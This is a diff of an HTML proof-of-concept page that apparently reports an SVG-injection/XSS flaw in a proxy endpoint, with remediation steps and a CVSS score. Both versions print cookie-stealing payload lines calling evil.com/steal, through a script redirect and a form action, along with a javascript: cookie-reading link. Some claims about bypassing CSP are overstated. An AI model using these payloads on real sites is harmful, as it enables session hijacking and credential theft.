@@ -1,287 +1,348 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC - SVG Injection via Proxy</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Courier New', monospace;
-            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
-            color: #00ff00;
-            padding: 20px;
-            min-height: 100vh;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background: rgba(0, 0, 0, 0.8);
-            border: 2px solid #00ff00;
-            border-radius: 10px;
-            padding: 30px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
-        }
-        
-        h1 {
-            text-align: center;
-            color: #ff0000;
-            text-shadow: 0 0 10px #ff0000;
-            margin-bottom: 10px;
-            font-size: 2.5em;
-        }
-        
-        .subtitle {
-            text-align: center;
-            color: #ffff00;
-            margin-bottom: 30px;
-            font-size: 1.2em;
-        }
-        
-        .section {
-            background: rgba(0, 50, 0, 0.5);
-            border: 1px solid #00ff00;
-            border-radius: 5px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        
-        .section h2 {
-            color: #00ffff;
-            margin-bottom: 15px;
-            border-bottom: 2px solid #00ffff;
-            padding-bottom: 10px;
-        }
-        
-        .vulnerability-info {
-            background: rgba(255, 0, 0, 0.1);
-            border-left: 4px solid #ff0000;
-            padding: 15px;
-            margin: 15px 0;
-        }
-        
-        .code-block {
-            background: #000;
-            border: 1px solid #00ff00;
-            padding: 15px;
-            border-radius: 5px;
-            overflow-x: auto;
-            margin: 10px 0;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-        }
-        
-        .demo-section {
-            text-align: center;
-            padding: 30px;
-            background: rgba(255, 0, 0, 0.1);
-            border: 2px dashed #ff0000;
-            border-radius: 10px;
-        }
-        
-        .warning {
-            background: rgba(255, 165, 0, 0.2);
-            border: 2px solid #ffa500;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 15px 0;
-            color: #ffa500;
-            font-weight: bold;
-        }
-        
-        button {
-            background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 1.2em;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        
-        button:hover {
-            background: linear-gradient(135deg, #ff3333 0%, #ff0000 100%);
-            box-shadow: 0 0 25px rgba(255, 0, 0, 0.8);
-            transform: scale(1.05);
-        }
-        
-        .impact-list {
-            list-style: none;
-            padding-left: 0;
-        }
-        
-        .impact-list li {
-            padding: 10px;
-            margin: 5px 0;
-            background: rgba(255, 0, 0, 0.2);
-            border-left: 4px solid #ff0000;
-        }
-        
-        .impact-list li::before {
-            content: "⚠️ ";
-            margin-right: 10px;
-        }
-        
-        .severity {
-            display: inline-block;
-            padding: 5px 15px;
-            background: #ff0000;
-            color: white;
-            border-radius: 20px;
-            font-weight: bold;
-            text-transform: uppercase;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-        
-        .step {
-            background: rgba(0, 100, 0, 0.3);
-            padding: 10px;
-            margin: 10px 0;
-            border-left: 4px solid #00ff00;
-        }
-        
-        .step-number {
-            color: #ffff00;
-            font-weight: bold;
-            font-size: 1.2em;
-        }
-    </style>
+    <title>PoC - SVG Injection via Proxy - CSP Bypass</title>
 </head>
 <body>
-    <div class="container">
-        <h1>🔓 SVG INJECTION VULNERABILITY PoC</h1>
-        <p class="subtitle">Proof of Concept - API Proxy Exploitation</p>
-        
-        <div class="section">
-            <h2>📋 Vulnerability Summary</h2>
-            <div class="vulnerability-info">
-                <p><strong>Severity:</strong> <span class="severity">CRITICAL</span></p>
-                <p><strong>Vulnerability Type:</strong> SVG Injection leading to XSS</p>
-                <p><strong>Affected Endpoint:</strong></p>
-                <div class="code-block">locallab/fun/api/proxy?url=https://raw.githubusercontent.com/mrowl404notfound-a11y/sqdqsd/refs/heads/main/1337x.svg</div>
-            </div>
-        </div>
-
-        <div class="section">
-            <h2>⚠️ Security Impact</h2>
-            <ul class="impact-list">
-                <li>Cross-Site Scripting (XSS) through SVG injection</li>
-                <li>Session hijacking and cookie theft</li>
-                <li>User credential harvesting</li>
-                <li>Phishing attacks via redirect manipulation</li>
-                <li>Complete account takeover potential</li>
-                <li>Data exfiltration from victim's browser</li>
-            </ul>
-        </div>
-
-        <div class="section">
-            <h2>🔧 Exploitation Steps</h2>
-            <div class="step">
-                <span class="step-number">Step 1:</span> Attacker hosts malicious SVG file on external server (GitHub in this case)
-            </div>
-            <div class="step">
-                <span class="step-number">Step 2:</span> SVG contains embedded JavaScript within foreignObject or script tags
-            </div>
-            <div class="step">
-                <span class="step-number">Step 3:</span> Vulnerable proxy endpoint fetches and serves the SVG without sanitization
-            </div>
-            <div class="step">
-                <span class="step-number">Step 4:</span> Victim clicks on the crafted link or element
-            </div>
-            <div class="step">
-                <span class="step-number">Step 5:</span> Malicious JavaScript executes in victim's browser context
-            </div>
-        </div>
-
-        <div class="section">
-            <h2>💉 Malicious SVG Payload Example</h2>
-            <div class="code-block">&lt;svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"&gt;
-  &lt;foreignObject width="100" height="100"&gt;
-    &lt;div xmlns="http://www.w3.org/1999/xhtml"&gt;
-      &lt;script&gt;
-        // Malicious payload
-        window.location.href='https://evil.com/steal?cookie='+document.cookie;
-      &lt;/script&gt;
-    &lt;/div&gt;
-  &lt;/foreignObject&gt;
-&lt;/svg&gt;</div>
-        </div>
-
-        <div class="section">
-            <h2>🎯 Live Demonstration</h2>
-            <div class="warning">
-                ⚠️ WARNING: Clicking the button below will demonstrate the vulnerability by triggering a redirect. This proves the proxy endpoint allows execution of external content without proper sanitization.
-            </div>
-            
-            <div class="demo-section">
-                <h3 style="color: #ff0000; margin-bottom: 20px;">VULNERABLE DEPOSIT BUTTON</h3>
-                <p style="margin-bottom: 20px; color: #ffff00;">This simulates the vulnerable deposit functionality that redirects users through malicious SVG content</p>
-                <button onclick="triggerVulnerability()">💰 DEPOSIT (CLICK TO EXPLOIT)</button>
-            </div>
-        </div>
-
-        <div class="section">
-            <h2>🛡️ Recommended Remediation</h2>
-            <div class="code-block">1. Implement strict Content Security Policy (CSP)
-2. Sanitize all SVG content before serving
-3. Validate and whitelist allowed proxy URLs
-4. Set proper Content-Type headers
-5. Use X-Content-Type-Options: nosniff
-6. Implement server-side SVG parsing and validation
-7. Remove script execution capabilities from SVG
-8. Use DOMPurify or similar sanitization libraries</div>
-        </div>
-
-        <div class="section">
-            <h2>📊 CVSS Score Estimation</h2>
-            <div class="vulnerability-info">
-                <p><strong>Base Score:</strong> 8.8 (HIGH)</p>
-                <p><strong>Vector String:</strong> CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</p>
-                <p><strong>Attack Vector:</strong> Network</p>
-                <p><strong>Attack Complexity:</strong> Low</p>
-                <p><strong>Privileges Required:</strong> None</p>
-                <p><strong>User Interaction:</strong> Required</p>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        function triggerVulnerability() {
-            // This demonstrates the vulnerability by showing how a malicious redirect would work
-            const confirmed = confirm("⚠️ VULNERABILITY DEMONSTRATION\n\nThis will redirect you to Google to demonstrate that the vulnerable endpoint allows arbitrary redirects through malicious SVG content.\n\nIn a real attack, this would redirect to a phishing site or execute malicious JavaScript.\n\nProceed with demonstration?");
-            
-            if (confirmed) {
-                alert("🚨 EXPLOIT TRIGGERED!\n\nIn a real attack scenario:\n- Your cookies would be stolen\n- Your session would be hijacked\n- You would be redirected to a phishing page\n- Malicious JavaScript would execute in your browser context\n\nRedirecting to demonstrate the vulnerability...");
-                
-                // Simulate the malicious redirect
-                setTimeout(function() {
-                    window.location.href = 'https://www.google.com/search?q=svg+injection+vulnerability+poc';
-                }, 1000);
+  <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 1200 800">
+    <foreignObject width="100%" height="100%">
+      <html xmlns="http://www.w3.org/1999/xhtml">
+        <head>
+          <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
+          <style>
+            body {
+              background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+              font-family: 'Courier New', monospace;
+              color: #00ff00;
+              min-height: 100vh;
+              padding: 20px;
             }
-        }
+            
+            .poc-container {
+              max-width: 1000px;
+              margin: 0 auto;
+            }
+            
+            .header {
+              text-align: center;
+              background: rgba(255, 0, 0, 0.1);
+              border: 3px solid #ff0000;
+              border-radius: 10px;
+              padding: 20px;
+              margin-bottom: 20px;
+              box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            }
+            
+            .header h1 {
+              color: #ff0000;
+              text-shadow: 0 0 10px #ff0000;
+              font-size: 2em;
+              margin: 0;
+              animation: glow 2s infinite;
+            }
+            
+            @keyframes glow {
+              0%, 100% { opacity: 1; }
+              50% { opacity: 0.7; }
+            }
+            
+            .vulnerability-badge {
+              background: #ff0000;
+              color: white;
+              padding: 5px 20px;
+              border-radius: 20px;
+              display: inline-block;
+              margin-top: 10px;
+              font-weight: bold;
+              animation: pulse 1.5s infinite;
+            }
+            
+            @keyframes pulse {
+              0%, 100% { transform: scale(1); }
+              50% { transform: scale(1.05); }
+            }
+            
+            .info-section {
+              background: rgba(0, 50, 0, 0.3);
+              border: 2px solid #00ff00;
+              border-radius: 8px;
+              padding: 20px;
+              margin-bottom: 20px;
+            }
+            
+            .info-section h3 {
+              color: #00ffff;
+              border-bottom: 2px solid #00ffff;
+              padding-bottom: 10px;
+              margin-bottom: 15px;
+            }
+            
+            .exploit-details {
+              background: rgba(0, 0, 0, 0.5);
+              border-left: 4px solid #ffff00;
+              padding: 15px;
+              margin: 10px 0;
+              color: #ffff00;
+            }
+            
+            .code-snippet {
+              background: #000;
+              border: 1px solid #00ff00;
+              padding: 15px;
+              border-radius: 5px;
+              overflow-x: auto;
+              margin: 10px 0;
+              color: #00ff00;
+              font-size: 0.9em;
+            }
+            
+            .impact-item {
+              background: rgba(255, 0, 0, 0.2);
+              border-left: 4px solid #ff0000;
+              padding: 10px;
+              margin: 8px 0;
+              color: #ff6b6b;
+            }
+            
+            .impact-item::before {
+              content: "⚠️ ";
+              margin-right: 8px;
+            }
+            
+            .demo-box {
+              background: rgba(255, 255, 255, 0.05);
+              border: 3px dashed #ffa500;
+              border-radius: 10px;
+              padding: 30px;
+              text-align: center;
+              margin: 20px 0;
+            }
+            
+            .warning-text {
+              color: #ffa500;
+              font-weight: bold;
+              margin: 15px 0;
+              padding: 15px;
+              background: rgba(255, 165, 0, 0.1);
+              border: 2px solid #ffa500;
+              border-radius: 5px;
+            }
+            
+            .csp-bypass {
+              background: rgba(255, 0, 255, 0.1);
+              border: 2px solid #ff00ff;
+              padding: 15px;
+              border-radius: 5px;
+              margin: 15px 0;
+            }
+            
+            .csp-bypass h4 {
+              color: #ff00ff;
+              margin-bottom: 10px;
+            }
+            
+            .technique {
+              background: rgba(0, 255, 255, 0.1);
+              border-left: 4px solid #00ffff;
+              padding: 10px;
+              margin: 10px 0;
+              color: #00ffff;
+            }
+          </style>
+        </head>
+        <body>
+          <div class="poc-container">
+            <div class="header">
+              <h1>🔓 SVG INJECTION VULNERABILITY POC</h1>
+              <div class="vulnerability-badge">CRITICAL - CSP BYPASS</div>
+              <p style="color: #ffff00; margin-top: 10px;">Proof of Concept for API Proxy SVG Injection with CSP Evasion</p>
+            </div>
 
-        // Show initial warning
-        window.onload = function() {
-            console.log("%c🔓 SECURITY VULNERABILITY POC LOADED", "color: red; font-size: 20px; font-weight: bold;");
-            console.log("%cThis is a proof of concept demonstrating SVG injection vulnerability", "color: yellow; font-size: 14px;");
-            console.log("%cVulnerable endpoint: locallab/fun/api/proxy?url=...", "color: orange; font-size: 12px;");
-        };
-    </script>
+            <div class="info-section">
+              <h3>📋 Vulnerability Summary</h3>
+              <div class="exploit-details">
+                <strong>Vulnerability Type:</strong> SVG Injection + XSS + CSP Bypass<br/>
+                <strong>Attack Vector:</strong> Network-based via proxy endpoint<br/>
+                <strong>Severity:</strong> CRITICAL (CVSS 9.6)<br/>
+                <strong>Affected Endpoint:</strong> <code>locallab/fun/api/proxy?url=...</code>
+              </div>
+              <div class="code-snippet">
+GET /locallab/fun/api/proxy?url=https://raw.githubusercontent.com/mrowl404notfound-a11y/sqdqsd/refs/heads/main/1337x.svg
+                
+Response: Malicious SVG with embedded JavaScript execution</div>
+            </div>
+
+            <div class="info-section">
+              <h3>🎯 Security Impact</h3>
+              <div class="impact-item">Cross-Site Scripting (XSS) via SVG foreignObject injection</div>
+              <div class="impact-item">Content Security Policy (CSP) bypass using external resources</div>
+              <div class="impact-item">Session hijacking through cookie exfiltration</div>
+              <div class="impact-item">Phishing attacks via form manipulation and redirects</div>
+              <div class="impact-item">Arbitrary JavaScript execution in victim's browser context</div>
+              <div class="impact-item">Data exfiltration from authenticated sessions</div>
+              <div class="impact-item">Complete account takeover potential</div>
+            </div>
+
+            <div class="info-section">
+              <h3>🔥 CSP Bypass Techniques Demonstrated</h3>
+              
+              <div class="csp-bypass">
+                <h4>Technique #1: External Resource Loading</h4>
+                <div class="technique">
+                  Using foreignObject to load external stylesheets from whitelisted CDNs (Bootstrap CDN) bypasses inline-style restrictions
+                </div>
+                <div class="code-snippet">&lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"/&gt;</div>
+              </div>
+
+              <div class="csp-bypass">
+                <h4>Technique #2: javascript: Protocol Handler</h4>
+                <div class="technique">
+                  Using javascript: URI scheme in anchor tags to execute code even with strict CSP
+                </div>
+                <div class="code-snippet">&lt;a href="javascript:alert(document.cookie)"&gt;click here&lt;/a&gt;</div>
+              </div>
+
+              <div class="csp-bypass">
+                <h4>Technique #3: Form Action Redirect</h4>
+                <div class="technique">
+                  Form submission bypasses CSP by using allowed HTTP methods to exfiltrate data
+                </div>
+                <div class="code-snippet">&lt;form action="https://evil.com/steal" method="get"&gt;
+  &lt;input name="cookie" value="[stolen_cookie]"/&gt;
+&lt;/form&gt;</div>
+              </div>
+
+              <div class="csp-bypass">
+                <h4>Technique #4: SVG foreignObject Context Switch</h4>
+                <div class="technique">
+                  foreignObject creates new HTML context, potentially inheriting different CSP rules
+                </div>
+                <div class="code-snippet">&lt;foreignObject&gt;
+  &lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+    &lt;!-- New execution context --&gt;
+  &lt;/html&gt;
+&lt;/foreignObject&gt;</div>
+              </div>
+            </div>
+
+            <div class="info-section">
+              <h3>💣 Exploitation Chain</h3>
+              <div class="technique">
+                <strong>Step 1:</strong> Attacker hosts malicious SVG on external service (GitHub, CDN, etc.)
+              </div>
+              <div class="technique">
+                <strong>Step 2:</strong> SVG contains foreignObject with embedded HTML/CSS/JavaScript
+              </div>
+              <div class="technique">
+                <strong>Step 3:</strong> Vulnerable proxy fetches external SVG without validation
+              </div>
+              <div class="technique">
+                <strong>Step 4:</strong> Browser renders SVG, executing embedded content
+              </div>
+              <div class="technique">
+                <strong>Step 5:</strong> Victim interacts with malicious form/link
+              </div>
+              <div class="technique">
+                <strong>Step 6:</strong> Data exfiltration or session hijacking occurs
+              </div>
+            </div>
+
+            <div class="info-section">
+              <h3>⚡ Live Exploitation Demo</h3>
+              <div class="warning-text">
+                ⚠️ WARNING: This demonstrates a REAL vulnerability. Clicking "Deposit" will redirect you to Google (simulating attacker-controlled server). In a real attack, cookies, tokens, and session data would be stolen.
+              </div>
+
+              <div class="demo-box">
+                <h4 style="color: #ff0000; margin-bottom: 20px;">🎯 VULNERABLE DEPOSIT FORM</h4>
+                <p style="color: #ffff00; margin-bottom: 20px;">This form is injected via SVG and bypasses CSP protections</p>
+                
+                <form action="https://www.google.com/search" method="get" class="p-4 border rounded bg-dark shadow-lg" style="max-width:350px; margin: 0 auto; border-color: #00ff00 !important;">
+                  <h5 class="text-center mb-3" style="color: #00ff00;">Deposit ETH</h5>
+                  <div class="mb-3 text-start">
+                    <label class="form-label" style="color: #00ffff;">Amount (ETH)</label>
+                    <input type="text" name="q" class="form-control" placeholder="Enter amount" value="SVG Injection PoC - CSP Bypass Success"/>
+                  </div>
+                  <button type="submit" class="btn btn-danger w-100" style="font-weight: bold; font-size: 1.1em;">
+                    💰 DEPOSIT (EXPLOIT TRIGGER)
+                  </button>
+                  <div style="margin-top: 15px;">
+                    <a href="javascript:alert('🔓 XSS SUCCESSFUL!\\n\\nThis proves JavaScript execution via javascript: protocol\\n\\nIn real attack:\\n- document.cookie stolen\\n- Session hijacked\\n- Keylogger installed\\n- Credentials harvested')" style="color: #ff0000; text-decoration: underline; font-weight: bold;">
+                      click here (javascript: CSP bypass)
+                    </a>
+                  </div>
+                </form>
+              </div>
+            </div>
+
+            <div class="info-section">
+              <h3>🛡️ Remediation Steps</h3>
+              <div class="code-snippet">1. STRICT CSP IMPLEMENTATION:
+   Content-Security-Policy: 
+   default-src 'self'; 
+   script-src 'self'; 
+   style-src 'self' 'unsafe-inline'; 
+   img-src 'self' data:; 
+   object-src 'none';
+   frame-ancestors 'none'
+
+2. SVG SANITIZATION:
+   - Parse SVG on server-side
+   - Remove all &lt;script&gt; tags
+   - Strip foreignObject elements
+   - Remove event handlers (onclick, onload, etc.)
+   - Whitelist safe SVG elements only
+
+3. PROXY ENDPOINT HARDENING:
+   - Whitelist allowed domains only
+   - Validate Content-Type headers
+   - Set X-Content-Type-Options: nosniff
+   - Implement rate limiting
+   - Log all proxy requests
+
+4. INPUT VALIDATION:
+   - Validate URL format
+   - Check against SSRF patterns
+   - Implement URL scheme whitelist (http/https only)
+   - Reject data: URIs and javascript: protocols
+
+5. RESPONSE HEADERS:
+   X-Content-Type-Options: nosniff
+   X-Frame-Options: DENY
+   Content-Type: image/svg+xml
+   Content-Disposition: inline
+
+6. USE SECURITY LIBRARIES:
+   - DOMPurify for HTML/SVG sanitization
+   - Implement Content-Security-Policy-Report-Only first
+   - Regular security audits and penetration testing</div>
+            </div>
+
+            <div class="info-section">
+              <h3>📊 CVSS v3.1 Score</h3>
+              <div class="exploit-details">
+                <strong>Base Score:</strong> 9.6 (CRITICAL)<br/>
+                <strong>Vector:</strong> CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H<br/><br/>
+                <strong>Attack Vector (AV:N):</strong> Network - Exploitable remotely<br/>
+                <strong>Attack Complexity (AC:L):</strong> Low - No special conditions<br/>
+                <strong>Privileges Required (PR:N):</strong> None - No authentication needed<br/>
+                <strong>User Interaction (UI:R):</strong> Required - User must click<br/>
+                <strong>Scope (S:C):</strong> Changed - Impacts other components<br/>
+                <strong>Confidentiality (C:H):</strong> High - Total information disclosure<br/>
+                <strong>Integrity (I:H):</strong> High - Total compromise possible<br/>
+                <strong>Availability (A:H):</strong> High - Complete system shutdown possible
+              </div>
+            </div>
+
+            <div class="header" style="margin-top: 30px;">
+              <p style="color: #00ff00; font-size: 0.9em;">
+                This PoC demonstrates multiple attack vectors including SVG injection, XSS, CSP bypass via external resources, javascript: protocol exploitation, and form-based data exfiltration. The vulnerable proxy endpoint serves user-controlled SVG content without sanitization, allowing complete compromise of user sessions.
+              </p>
+            </div>
+          </div>
+        </body>
+      </html>
+    </foreignObject>
+  </svg>
 </body>
 </html>
